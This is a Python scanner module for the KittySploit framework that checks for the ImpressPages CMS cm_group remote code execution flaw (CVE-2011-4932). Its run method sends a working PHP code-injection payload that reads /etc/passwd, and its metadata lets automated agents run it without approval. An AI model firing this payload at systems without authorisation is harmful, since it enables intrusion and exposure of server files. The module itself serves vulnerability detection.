#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ImpressPages CMS actions.php / cm_group RCE (CVE-2011-4932)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ImpressPages - cm_group RCE Detection (CVE-2011-4932)',
        'description': (
            'Detects CVE-2011-4932 by requesting cm_group injection that echoes '
            'file_get_contents(/etc/passwd).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2011', 'impresspages', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4932',
        ],
        'cve': 'CVE-2011-4932',
    }

    def run(self):
        for base in ('', '/impresspages', '/ip'):
            path = (
                f'{base}/?cm_group=text_photos\\title\\Module();'
                'echo%20file_get_contents(%27/etc/passwd%27);echo&cm_name=vt-test'
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='ImpressPages cm_group RCE (CVE-2011-4932)',
                    path=f'{base}/',
                )
                return True
        return False
